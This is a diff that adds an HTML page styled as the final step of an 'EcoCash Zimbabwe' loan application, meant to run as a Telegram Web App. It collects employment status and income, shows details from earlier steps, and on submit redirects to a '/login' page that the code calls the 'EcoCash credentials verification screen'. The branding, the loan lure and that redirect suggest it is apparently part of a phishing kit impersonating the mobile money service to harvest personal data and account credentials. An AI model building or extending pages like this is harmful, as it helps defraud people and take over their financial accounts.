@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>EcoCash - Loan Application Step 3</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #f1f3f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Top Header Navigation bar */
+        .app-header {
+            width: 100%;
+            background-color: #0066ff;
+            padding: 15px 20px;
+            color: white;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-sizing: border-box;
+            position: relative;
+        }
+
+        .back-btn {
+            color: white;
+            text-decoration: none;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .header-title {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        .header-title .eco { color: #ffffff; }
+        .header-title .cash { color: #ff3333; }
+
+        .menu-icon {
+            font-size: 24px;
+            cursor: pointer;
+        }
+
+        /* Card Layout */
+        .card {
+            background: white;
+            width: 92%;
+            max-width: 450px;
+            margin: 20px 0;
+            padding: 25px 20px;
+            border-radius: 15px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .main-title {
+            font-size: 24px;
+            color: #0066ff;
+            margin: 0 0 5px;
+            text-align: center;
+            font-weight: bold;
+        }
+
+        .subtext {
+            font-size: 13px;
+            color: #888;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        /* Step Progress Bar (All 3 Active) */
+        .step-indicator {
+            display: flex;
+            justify-content: space-between;
+            gap: 10px;
+            margin-bottom: 25px;
+        }
+
+        .step-bar {
+            flex: 1;
+            height: 4px;
+            background-color: #e0e0e0;
+            border-radius: 2px;
+        }
+
+        .step-bar.active {
+            background-color: #ff4d4d;
+        }
+
+        /* Form Inputs */
+        .form-group {
+            margin-bottom: 20px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .form-group label {
+            font-size: 14px;
+            font-weight: bold;
+            color: #444;
+            margin-bottom: 8px;
+        }
+
+        .form-control {
+            font-size: 16px;
+            padding: 12px 15px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            background-color: #fcfcfc;
+            color: #333;
+            box-sizing: border-box;
+            outline: none;
+            width: 100%;
+        }
+
+        .form-control:focus {
+            border-color: #0066ff;
+        }
+
+        select.form-control {
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23888888' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: right 15px center;
+            background-size: 15px;
+            padding-right: 40px;
+            cursor: pointer;
+        }
+
+        /* Application Summary Styled Card */
+        .summary-card {
+            background-color: #fffbf2;
+            border: 1px solid #f9edd4;
+            border-left: 4px solid #ff4d4d;
+            border-radius: 8px;
+            padding: 20px 15px;
+            margin-bottom: 25px;
+        }
+
+        .summary-title {
+            font-size: 16px;
+            font-weight: bold;
+            color: #0066ff;
+            margin-top: 0;
+            margin-bottom: 15px;
+        }
+
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+
+        .summary-row:last-child {
+            margin-bottom: 0;
+        }
+
+        .summary-label {
+            color: #888;
+        }
+
+        .summary-value {
+            color: #0066ff;
+            font-weight: bold;
+            text-align: right;
+            word-break: break-all;
+            max-width: 60%;
+        }
+
+        /* Dual Action Button Footer */
+        .button-group {
+            display: flex;
+            gap: 15px;
+            margin-top: 10px;
+        }
+
+        .btn-prev {
+            flex: 1;
+            background-color: #f1f3f5;
+            color: #333;
+            border: 1px solid #ccc;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            text-align: center;
+            text-transform: uppercase;
+        }
+
+        .btn-prev:active {
+            background-color: #e2e6ea;
+        }
+
+        .btn-next {
+            flex: 1.2;
+            background-color: #0066ff;
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            text-align: center;
+            line-height: 1.2;
+        }
+
+        .btn-next:active {
+            opacity: 0.9;
+        }
+
+        /* Footer Copyright */
+        .footer-banner {
+            width: 100%;
+            background-color: #0066ff;
+            color: rgba(255, 255, 255, 0.8);
+            text-align: center;
+            padding: 15px;
+            font-size: 12px;
+            margin-top: auto;
+            box-sizing: border-box;
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- Header Navigation Bar -->
+<div class="app-header">
+    <a href="/page3" class="back-btn">← Back</a>
+    <div class="header-title">
+        <span class="eco">Eco</span><span class="cash">Cash</span>
+    </div>
+    <span class="menu-icon">☰</span>
+</div>
+
+<div class="card">
+    <h1 class="main-title">Loan Application</h1>
+    <div class="subtext">Step 3 of 3</div>
+
+    <!-- Step Bar Progress Indicators (All Active) -->
+    <div class="step-indicator">
+        <div class="step-bar active"></div>
+        <div class="step-bar active"></div>
+        <div class="step-bar active"></div>
+    </div>
+
+    <!-- Step 3 Form -->
+    <form id="step3Form" onsubmit="submitStep3(event)">
+        <div class="form-group">
+            <label for="employmentStatus">Employment Status</label>
+            <select id="employmentStatus" class="form-control" required>
+                <option value="Self-Employed" selected>Self-Employed</option>
+                <option value="Employed">Employed</option>
+                <option value="Unemployed">Unemployed</option>
+                <option value="Student">Student</option>
+            </select>
+        </div>
+
+        <div class="form-group">
+            <label for="annualIncome">Annual Income (USD)</label>
+            <input type="number" id="annualIncome" class="form-control" placeholder="Enter your annual income" required>
+        </div>
+
+        <!-- Dynamic Application Summary Box -->
+        <div class="summary-card">
+            <h3 class="summary-title">Application Summary</h3>
+            <div class="summary-row">
+                <span class="summary-label">Loan Amount:</span>
+                <span id="summaryAmount" class="summary-value">USD 0.00</span>
+            </div>
+            <div class="summary-row">
+                <span class="summary-label">Loan Term:</span>
+                <span id="summaryTerm" class="summary-value">0 months</span>
+            </div>
+            <div class="summary-row">
+                <span class="summary-label">Purpose:</span>
+                <span id="summaryPurpose" class="summary-value">Not specified</span>
+            </div>
+            <div class="summary-row">
+                <span class="summary-label">Applicant:</span>
+                <span id="summaryApplicant" class="summary-value">Name Not Found</span>
+            </div>
+        </div>
+
+        <!-- Button Layout -->
+        <div class="button-group">
+            <button type="button" class="btn-prev" onclick="goBack()">Previous</button>
+            <button type="submit" class="btn-next">SUBMIT<br>APPLICATION</button>
+        </div>
+    </form>
+</div>
+
+<div class="footer-banner">
+    © 2026 EcoCash Zimbabwe
+</div>
+
+<script>
+    window.onload = () => {
+        const tg = window.Telegram?.WebApp;
+        if (tg) {
+            tg.ready();
+            tg.expand();
+        }
+
+        // Pull previous step inputs from localStorage
+        const appliedAmount = localStorage.getItem('appliedAmount') || localStorage.getItem('amount') || "0";
+        const appliedTerm = localStorage.getItem('appliedTerm') || localStorage.getItem('loanDuration') || "0 months";
+        const appliedPurpose = localStorage.getItem('appliedPurpose') || "Not specified";
+        
+        const firstName = localStorage.getItem('firstName') || "";
+        const lastName = localStorage.getItem('lastName') || "";
+        const applicantName = (firstName || lastName) ? `${firstName} ${lastName}` : "Name Not Found";
+
+        // Update application summary fields dynamically matching user values
+        document.getElementById('summaryAmount').innerText = `USD ${Number(appliedAmount).toLocaleString()}`;
+        document.getElementById('summaryTerm').innerText = appliedTerm.toLowerCase();
+        document.getElementById('summaryPurpose').innerText = appliedPurpose;
+        document.getElementById('summaryApplicant').innerText = applicantName;
+    };
+
+    function goBack() {
+        window.location.href = "/page3";
+    }
+
+    function submitStep3(event) {
+        event.preventDefault();
+
+        const employmentStatus = document.getElementById('employmentStatus').value;
+        const annualIncome = document.getElementById('annualIncome').value;
+
+        // Store current page values
+        localStorage.setItem('employmentStatus', employmentStatus);
+        localStorage.setItem('annualIncome', annualIncome);
+
+        // Redirect user to the EcoCash credentials verification screen
+        window.location.href = "/login"; 
+    }
+</script>
+
+</body>
+</html>
